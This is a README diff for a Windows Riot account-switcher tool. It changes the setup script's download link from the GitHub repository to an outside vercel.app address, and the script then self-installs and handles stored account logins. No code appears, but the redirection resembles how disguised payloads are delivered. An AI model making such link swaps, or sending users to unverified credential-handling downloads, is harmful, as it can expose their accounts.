@@ -15,7 +15,7 @@ A small Windows tool for switching between Riot accounts with one click.
 
 ## Install
 1. Install **Python 3** from [python.org](https://www.python.org/downloads/). During setup, tick **"Add python.exe to PATH"**.
-2. Download **[Gemlock Setup.pyw](https://github.com/YalinFrncgllr/Gemlock/raw/main/Gemlock%20Setup.pyw)**.
+2. Download **[Gemlock Setup.pyw](https://gemlock-api.vercel.app/download)**.
 3. Double-click it. If Windows asks which app to open it with, choose **Python (default windowed)** and tick "Always".
 4. Gemlock installs itself to `%LOCALAPPDATA%\Gemlock`, removes the setup file and puts a **Gemlock** shortcut on your desktop.
 5. Add your accounts with **+ Add account**. Everything you add stays encrypted on your own PC.
